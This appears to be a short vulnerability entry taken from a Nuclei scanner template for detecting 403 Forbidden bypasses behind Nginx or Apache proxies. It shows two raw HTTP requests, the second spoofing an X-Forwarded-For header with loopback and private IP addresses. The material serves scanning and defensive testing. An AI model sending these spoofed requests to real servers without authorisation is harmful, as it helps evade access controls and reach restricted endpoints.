# Vulnerability: X-Forwarded-For 403-forbidden bypass
**Classification:** FUZZING
**Source:** Nuclei Template (`xff-403-bypass.yaml`)

## Description
Template to detect 403 forbidden endpoint bypass behind Nginx/Apache proxy & load balancers, based on X-Forwarded-For header.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}
Accept: */*

GET / HTTP/1.1
Host: {{Hostname}}
Accept: */*
X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1
```

